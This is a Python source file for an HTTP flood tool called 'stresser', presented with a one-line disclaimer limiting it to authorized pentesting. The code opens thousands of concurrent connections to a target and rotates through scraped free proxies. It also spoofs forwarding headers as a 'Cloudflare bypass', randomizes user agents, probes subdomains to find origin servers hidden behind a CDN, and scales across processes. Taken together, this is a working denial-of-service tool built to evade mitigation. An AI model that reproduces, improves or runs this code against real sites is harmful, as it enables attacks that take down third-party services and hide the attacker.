#!/usr/bin/env python3
"""
Stresser - High-throughput HTTP stress-testing tool for authorized pentesting.
Raw TCP sockets with pipeline parallelism, proxy rotation, Cloudflare bypass.

Usage:
  python3 stresser.py http://target.com -d 30 -c 2000
  python3 stresser.py http://target.com --proxy-list proxies.txt
  python3 stresser.py http://target.com --scrape-proxies
  python3 stresser.py --mode server

DISCLAIMER: For authorized security testing only.
"""
import asyncio
import argparse
import sys
import time
import random
import socket
import ssl as sslmod
import re
import os
from typing import Dict, List, Tuple
from urllib.parse import urlparse

# Set spawn start method for multiprocessing
import multiprocessing as mp
try:
    mp.set_start_method('spawn', force=True)
except RuntimeError:
    pass

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/120.0.0.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0",
]

PROXY_SCRAPE_URLS = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all",
    "https://proxylist.geonode.com/api/proxy-list?limit=100&page=1&sort_by=lastChecked&sort_type=desc",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://spys.me/proxy.txt",
]

# ---------------------------------------------------------------------------
# Proxy scraper
# ---------------------------------------------------------------------------
async def scrape_proxies(timeout: int = 10) -> List[str]:
    import aiohttp
    proxies: List[str] = []
    seen: set = set()

    async def fetch_one(client: aiohttp.ClientSession, url: str) -> None:
        try:
            async with client.get(url, timeout=aiohttp.ClientTimeout(total=timeout)) as resp:
                if resp.status != 200:
                    return
                text = await resp.text()
                for line in text.strip().split("\n"):
                    line = line.strip()
                    m = re.match(r"(\d+\.\d+\.\d+\.\d+):(\d+)", line)
                    if m:
                        entry = f"{m.group(1)}:{m.group(2)}"
                        if entry not in seen:
                            seen.add(entry)
                            proxies.append(entry)
        except Exception:
            pass

    connector = aiohttp.TCPConnector(limit=10, limit_per_host=5)
    async with aiohttp.ClientSession(connector=connector) as client:
        tasks = [fetch_one(client, url) for url in PROXY_SCRAPE_URLS]
        await asyncio.gather(*tasks, return_exceptions=True)

    if proxies:
        print(f"  [+] Scraped {len(proxies)} proxies from {len(PROXY_SCRAPE_URLS)} sources")
    else:
        print("  [-] No proxies found via scraping")
    return proxies


def load_proxy_file(path: str) -> List[str]:
    proxies = []
    with open(path) as f:
        for line in f:
            line = line.strip()
            if line and re.match(r"\d+\.\d+\.\d+\.\d+:\d+", line):
                proxies.append(line)
    print(f"  [+] Loaded {len(proxies)} proxies from {path}")
    return proxies


# ---------------------------------------------------------------------------
# Request builder
# ---------------------------------------------------------------------------
def build_requests(host: str, port: int, path: str, count: int,
                   cf_bypass: bool, rand_ua: bool) -> bytes:
    reqs = bytearray()
    for _ in range(count):
        ua = random.choice(USER_AGENTS) if rand_ua else USER_AGENTS[0]
        cf_hdrs = ""
        if cf_bypass:
            fip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            cf_hdrs = (
                f"X-Forwarded-For: {fip}\r\n"
                f"X-Real-IP: {fip}\r\n"
                f"CF-Connecting-IP: {fip}\r\n"
                f"X-Originating-IP: {fip}\r\n"
                f"X-Forwarded-Host: {fip}\r\n"
                f"Client-IP: {fip}\r\n"
            )
        req = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}:{port}\r\n"
            f"User-Agent: {ua}\r\n"
            f"Accept: text/html,*/*;q=0.8\r\n"
            f"Accept-Language: en-US,en;q=0.9\r\n"
            f"Connection: keep-alive\r\n"
            f"{cf_hdrs}"
            f"\r\n"
        )
        reqs.extend(req.encode())
    return bytes(reqs)


# ---------------------------------------------------------------------------
# Stats
# ---------------------------------------------------------------------------
class StressStats:
    __slots__ = ("completed", "failed", "bytes_recv", "lat_total",
                 "lat_min", "lat_max", "status_codes", "errors")
    def __init__(self):
        self.completed = 0
        self.failed = 0
        self.bytes_recv = 0
        self.lat_total = 0.0
        self.lat_min = float('inf')
        self.lat_max = 0.0
        self.status_codes: Dict[int, int] = {}
        self.errors: Dict[str, int] = {}


# ---------------------------------------------------------------------------
# Async HTTP response reader (handles Content-Length, chunked, EOF)
# ---------------------------------------------------------------------------
async def read_http_response(reader, timeout):
    """Read full HTTP response. Returns (status_code, body_length, error_msg)."""
    buf = b""
    while b"\r\n\r\n" not in buf:
        chunk = await asyncio.wait_for(reader.read(4096), timeout=timeout)
        if not chunk:
            return (0, 0, "EOF before headers")
        buf += chunk

    header_end = buf.index(b"\r\n\r\n") + 4
    headers_raw = buf[:header_end]
    body = buf[header_end:]

    status = 0
    if headers_raw.startswith(b"HTTP/"):
        try:
            parts = headers_raw.split(b" ", 2)
            status = int(parts[1])
        except (ValueError, IndexError):
            pass

    content_len = -1
    is_chunked = False
    for hdr in headers_raw.split(b"\r\n"):
        hl = hdr.lower()
        if hl.startswith(b"content-length:"):
            try:
                content_len = int(hdr.split(b":")[1].strip())
            except (ValueError, IndexError):
                pass
        elif hl.startswith(b"transfer-encoding:"):
            if b"chunked" in hl:
                is_chunked = True

    try:
        if content_len >= 0:
            while len(body) < content_len:
                chunk = await asyncio.wait_for(reader.read(65536), timeout=timeout)
                if not chunk:
                    break
                body += chunk
        elif is_chunked:
            while not body.endswith(b"0\r\n\r\n"):
                chunk = await asyncio.wait_for(reader.read(65536), timeout=timeout)
                if not chunk:
                    break
                body += chunk
    except asyncio.TimeoutError:
        pass

    return (status, len(body), None)


# ---------------------------------------------------------------------------
# Connection worker: persistent TCP connection with keep-alive
# ---------------------------------------------------------------------------
async def connection_worker(
    cid: int, host: str, port: int, path: str,
    deadline: float, timeout: float,
    cf_bypass: bool, rand_ua: bool, is_https: bool,
    proxy_list: List[str], stats: StressStats,
) -> None:
    ssl_ctx = None
    if is_https:
        ssl_ctx = sslmod.create_default_context()
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = sslmod.CERT_NONE

    PIPELINE = 1
    MERGE_EVERY = 500
    ok = fail = recv = 0
    lat_total = 0.0
    lat_min = float('inf')
    lat_max = 0.0
    sc: Dict[int, int] = {}
    errs: Dict[str, int] = {}

    def merge():
        nonlocal ok, fail, recv, lat_total, lat_min, lat_max, sc, errs
        stats.completed += ok
        stats.failed += fail
        stats.bytes_recv += recv
        stats.lat_total += lat_total
        if lat_min < stats.lat_min:
            stats.lat_min = lat_min
        if lat_max > stats.lat_max:
            stats.lat_max = lat_max
        for code, cnt in sc.items():
            stats.status_codes[code] = stats.status_codes.get(code, 0) + cnt
        for e, cnt in errs.items():
            stats.errors[e] = stats.errors.get(e, 0) + cnt
        ok = fail = recv = 0
        lat_total = 0.0
        lat_min = float('inf')
        lat_max = 0.0
        sc = {}
        errs = {}

    # Determine target (proxy or direct)
    target_host, target_port = host, port
    use_ssl = is_https
    if proxy_list:
        entry = random.choice(proxy_list)
        parts = entry.split(":")
        target_host = parts[0]
        target_port = int(parts[1])
        use_ssl = False

    # Pre-build static parts of request for efficiency
    host_header = host if (port == 80 or port == 443) else f"{host}:{port}"
    req_prefix = f"GET {path} HTTP/1.1\r\nHost: {host_header}\r\nUser-Agent: "
    req_suffix = "\r\nAccept: text/html,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.9\r\nConnection: keep-alive"

    reader = None
    writer = None

    try:
        while time.time() < deadline:
            if writer is None:
                try:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(
                            target_host, target_port,
                            ssl=ssl_ctx if use_ssl else None,
                        ),
                        timeout=timeout,
                    )
                except Exception as e:
                    errs[f"connect:{type(e).__name__}"] = errs.get(f"connect:{type(e).__name__}", 0) + 1
                    fail += 1
                    await asyncio.sleep(0.02)
                    if ok + fail >= MERGE_EVERY:
                        merge()
                    continue

            # Request pipelining: send PIPELINE requests before reading any response
            t0 = time.time()
            ua = random.choice(USER_AGENTS) if rand_ua else USER_AGENTS[0]
            # Build one request template (same UA for the whole batch)
            cf_bytes = b""
            if cf_bypass:
                fip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                cf_bytes = f"\r\nX-Forwarded-For: {fip}\r\nX-Real-IP: {fip}\r\nCF-Connecting-IP: {fip}\r\nX-Originating-IP: {fip}\r\nX-Forwarded-Host: {fip}\r\nClient-IP: {fip}".encode()
            single_req = req_prefix.encode() + ua.encode() + req_suffix.encode() + cf_bytes + b"\r\n\r\n"
            pipeline_reqs = single_req * PIPELINE

            try:
                writer.write(pipeline_reqs)
                await writer.drain()

                for _ in range(PIPELINE):
                    status, body_len, err = await read_http_response(reader, timeout)
                    if err:
                        raise ConnectionResetError(err)

                    lat = time.time() - t0
                    ok += 1
                    recv += body_len
                    lat_total += lat
                    if lat < lat_min:
                        lat_min = lat
                    if lat > lat_max:
                        lat_max = lat
                    sc[status] = sc.get(status, 0) + 1
                    if ok + fail >= MERGE_EVERY:
                        merge()

            except Exception as e:
                errs[type(e).__name__] = errs.get(type(e).__name__, 0) + 1
                fail += 1
                try:
                    writer.close()
                    await writer.wait_closed()
                except Exception:
                    pass
                writer = None
                reader = None

    except asyncio.CancelledError:
        pass
    finally:
        if writer is not None:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass
        merge()



async def stress(url: str, duration: int, connections: int, timeout: float,
                 cf_bypass: bool, rand_ua: bool, proxy_list: List[str]) -> None:
    parsed = urlparse(url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query
    is_https = parsed.scheme == "https"
    deadline = time.time() + duration

    print(f"  Target:      {url}")
    print(f"  Duration:    {duration}s")
    print(f"  Connections: {connections}")
    if proxy_list:
        print(f"  Proxies:     {len(proxy_list)} rotating")
    if cf_bypass:
        print("  CF Bypass:   enabled")
    if rand_ua:
        print("  Rand UA:     enabled")
    print()

    stats = StressStats()
    start = time.time()

    workers = [
        connection_worker(i, host, port, path, deadline, timeout,
                          cf_bypass, rand_ua, is_https, proxy_list, stats)
        for i in range(connections)
    ]
    tasks = [asyncio.create_task(w) for w in workers]

    last_print = 0.0
    try:
        while time.time() < deadline:
            now = time.time()
            if now - last_print >= 0.5:
                total = stats.completed + stats.failed
                e = now - start
                r = total / e if e > 0 else 0
                fp = (stats.failed / total * 100) if total > 0 else 0
                sys.stdout.write(
                    f"\r  RPS: {r:>8.2f}  Total: {total:>8d}  "
                    f"OK: {stats.completed:>8d}  Fail: {stats.failed:>6d} ({fp:>4.1f}%)  "
                    f"Elapsed: {e:>5.1f}s  "
                )
                sys.stdout.flush()
                last_print = now
            await asyncio.sleep(0.1)
    except asyncio.CancelledError:
        pass

    # Cancel all workers and ensure they flush their stats
    for t in tasks:
        t.cancel()
    await asyncio.gather(*tasks, return_exceptions=True)

    elapsed = time.time() - start
    total = stats.completed + stats.failed
    rps = total / elapsed if elapsed > 0 else 0
    sys.stdout.write(
        f"\r  RPS: {rps:>8.2f}  Total: {total:>8d}  "
        f"OK: {stats.completed:>8d}  Fail: {stats.failed:>6d}  "
        f"Elapsed: {elapsed:>5.1f}s  \n"
    )

    print(f"\n{'='*60}")
    print("  STRESS TEST RESULTS")
    print(f"{'='*60}")
    print(f"  Duration:      {elapsed:.2f}s")
    print(f"  Total:         {total:,}")
    print(f"  Completed:     {stats.completed:,}")
    print(f"  Failed:        {stats.failed:,}")
    print(f"  Requests/sec:  {rps:,.2f}")
    if stats.bytes_recv:
        print(f"  Throughput:    {stats.bytes_recv/1024/1024:.2f} MB/s")
    if stats.completed > 0:
        avg_lat = stats.lat_total / stats.completed
        print(f"  Avg latency:   {avg_lat*1000:.2f}ms")
        print(f"  Min latency:   {stats.lat_min*1000:.2f}ms")
        print(f"  Max latency:   {stats.lat_max*1000:.2f}ms")
        print(f"  Status codes:  {dict(sorted(stats.status_codes.items()))}")
    if stats.errors:
        print(f"  Errors:        {dict(sorted(stats.errors.items()))}")
    print(f"{'='*60}\n")


def run_server():
    import http.server, socketserver
    class H(http.server.BaseHTTPRequestHandler):
        body = b"ok\r\n"
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(self.body)))
            self.send_header("Connection", "keep-alive")
            self.end_headers()
            self.wfile.write(self.body)
        def log_message(self, *a): pass
    class TS(socketserver.ThreadingMixIn, socketserver.TCPServer):
        allow_reuse_address = True; daemon_threads = True; request_queue_size = 10000
    httpd = TS(("0.0.0.0", 8080), H)
    print("[*] Test server on :8080")
    try: httpd.serve_forever()
    except KeyboardInterrupt: print("\n[!] Stopped.")


def main():
    p = argparse.ArgumentParser(
        description="Stresser - high-throughput HTTP stress testing tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Examples:
  python3 stresser.py http://target.com -d 30 -c 2000
  python3 stresser.py https://target.com -d 60 -c 500 --cf-bypass
  python3 stresser.py http://target.com --scrape-proxies -c 200
  python3 stresser.py http://target.com --proxy-list proxies.txt --rand-ua
        """,
    )
    p.add_argument("url", nargs="?", help="Target URL")
    p.add_argument("--mode", choices=["server", "client"], default="client")
    p.add_argument("-d", "--duration", type=int, default=30, help="Test duration in seconds")
    p.add_argument("-c", "--connections", type=int, default=200,
                   help="Concurrent connections (default: 200)")
    p.add_argument("-t", "--timeout", type=float, default=10, help="I/O timeout in seconds")
    p.add_argument("--cf-bypass", action="store_true",
                   help="Add Cloudflare bypass headers (X-Forwarded-For, etc.)")
    p.add_argument("--rand-ua", action="store_true",
                   help="Randomize User-Agent per request")
    p.add_argument("--discover-origin", action="store_true",
                   help="Attempt to discover origin server behind Cloudflare")
    p.add_argument("--proxy-list", type=str, metavar="FILE",
                   help="File with proxies (one ip:port per line)")
    p.add_argument("--scrape-proxies", action="store_true",
                   help="Scrape free proxies from public APIs before starting")
    p.add_argument("--scrape-timeout", type=int, default=15,
                   help="Timeout in seconds for proxy scraping")
    p.add_argument("-p", "--processes", type=int, default=1,
                   help="Number of parallel processes (default: 1). More processes = higher RPS.")
    args = p.parse_args()

    if args.mode == "server":
        run_server()
        return

    if not args.url:
        p.print_help()
        sys.exit(1)

    proxy_list: List[str] = []
    if args.proxy_list:
        proxy_list.extend(load_proxy_file(args.proxy_list))
    if args.scrape_proxies:
        print("[*] Scraping proxies from public APIs...")
        try:
            scraped = asyncio.run(scrape_proxies(args.scrape_timeout))
            proxy_list.extend(scraped)
        except Exception as e:
            print(f"  [-] Proxy scrape failed: {e}")
        seen: set = set()
        deduped = []
        for pe in proxy_list:
            if pe not in seen:
                seen.add(pe)
                deduped.append(pe)
        proxy_list = deduped
        print(f"  [+] Total unique proxies: {len(proxy_list)}")

    if args.discover_origin:
        host = urlparse(args.url).hostname
        print(f"[*] Origin discovery for {host}...")
        for sub in ["direct", "origin", "cdn", "mail", "api", "dev", "staging", "test"]:
            try:
                ip = socket.gethostbyname(f"{sub}.{host}")
                print(f"  {sub}.{host} -> {ip}")
            except Exception:
                pass
        return

    if args.processes > 1:
        run_mp(args.url, args.duration, args.connections, args.timeout,
               args.cf_bypass, args.rand_ua, proxy_list, args.processes)
    else:
        asyncio.run(stress(args.url, args.duration, args.connections,
                           args.timeout, args.cf_bypass, args.rand_ua, proxy_list))


def run_mp(url: str, duration: int, connections: int, timeout: float,
            cf_bypass: bool, rand_ua: bool, proxy_list: List[str],
            num_processes: int) -> None:
    """Run stress test across multiple processes for higher throughput."""
    conns_per_process = max(1, connections // num_processes)
    procs = []
    total_conns = conns_per_process * num_processes
    remaining = connections - total_conns

    print(f"[+] Spawning {num_processes} processes ({total_conns + remaining} total connections)...")
    print()

    # Create queues for each process to report results
    results: List[mp.Queue] = [mp.Queue() for _ in range(num_processes)]

    for i in range(num_processes):
        c = conns_per_process + (1 if i < remaining else 0)
        p = mp.Process(
            target=_mp_worker,
            args=(i, url, duration, c, timeout, cf_bypass, rand_ua, proxy_list, results[i]),
            daemon=True,
        )
        p.start()
        procs.append(p)

    start = time.time()
    try:
        for p in procs:
            p.join()
    except KeyboardInterrupt:
        print("\n[!] Interrupting workers...")
        for p in procs:
            p.kill()
        sys.exit(1)

    elapsed = time.time() - start

    # Aggregate results
    total_ok = total_fail = total_recv = 0
    total_lat = 0.0
    lat_min = float('inf')
    lat_max = 0.0
    all_sc: Dict[int, int] = {}
    all_errors: Dict[str, int] = {}

    for q in results:
        try:
            r = q.get_nowait()
        except Exception:
            continue
        total_ok += r.get('ok', 0)
        total_fail += r.get('fail', 0)
        total_recv += r.get('bytes', 0)
        total_lat += r.get('lat_total', 0.0)
        if r.get('lat_min', float('inf')) < lat_min:
            lat_min = r['lat_min']
        if r.get('lat_max', 0.0) > lat_max:
            lat_max = r['lat_max']
        for code, cnt in r.get('sc', {}).items():
            all_sc[code] = all_sc.get(code, 0) + cnt
        for e, cnt in r.get('errors', {}).items():
            all_errors[e] = all_errors.get(e, 0) + cnt

    total = total_ok + total_fail
    rps = total / elapsed if elapsed > 0 else 0

    print(f"\n{'='*60}")
    print("  MULTI-PROCESS AGGREGATED RESULTS")
    print(f"{'='*60}")
    print(f"  Duration:      {elapsed:.2f}s")
    print(f"  Processes:     {num_processes}")
    print(f"  Total:         {total:,}")
    print(f"  Completed:     {total_ok:,}")
    print(f"  Failed:        {total_fail:,}")
    print(f"  Requests/sec:  {rps:,.2f}")
    if total_recv:
        print(f"  Throughput:    {total_recv/1024/1024:.2f} MB/s")
    if total_ok > 0:
        avg_lat = total_lat / total_ok
        print(f"  Avg latency:   {avg_lat*1000:.2f}ms")
        print(f"  Min latency:   {lat_min*1000:.2f}ms")
        print(f"  Max latency:   {lat_max*1000:.2f}ms")
        print(f"  Status codes:  {dict(sorted(all_sc.items()))}")
    if all_errors:
        print(f"  Errors:        {dict(sorted(all_errors.items()))}")
    print(f"{'='*60}\n")


def _mp_worker(pid: int, url: str, duration: int, connections: int,
               timeout: float, cf_bypass: bool, rand_ua: bool,
               proxy_list: List[str], result_queue: mp.Queue) -> None:
    """Target function for multiprocessing worker."""
    import asyncio
    # Run stress test and capture results
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        stats = loop.run_until_complete(
            _run_and_collect(url, duration, connections, timeout,
                            cf_bypass, rand_ua, proxy_list)
        )
    finally:
        loop.close()
    result_queue.put(stats)


async def _run_and_collect(url: str, duration: int, connections: int,
                           timeout: float, cf_bypass: bool, rand_ua: bool,
                           proxy_list: List[str]) -> dict:
    """Run stress test and return stats dict."""
    parsed = urlparse(url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query
    is_https = parsed.scheme == "https"
    deadline = time.time() + duration

    stats = StressStats()
    workers = [
        connection_worker(i, host, port, path, deadline, timeout,
                          cf_bypass, rand_ua, is_https, proxy_list, stats)
        for i in range(connections)
    ]
    tasks = [asyncio.create_task(w) for w in workers]

    # Wait for deadline
    await asyncio.sleep(duration + 0.5)

    # Cancel remaining
    for t in tasks:
        t.cancel()
    await asyncio.gather(*tasks, return_exceptions=True)

    return {
        'ok': stats.completed,
        'fail': stats.failed,
        'bytes': stats.bytes_recv,
        'lat_total': stats.lat_total,
        'lat_min': stats.lat_min,
        'lat_max': stats.lat_max,
        'sc': stats.status_codes,
        'errors': stats.errors,
    }


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
        sys.exit(0)








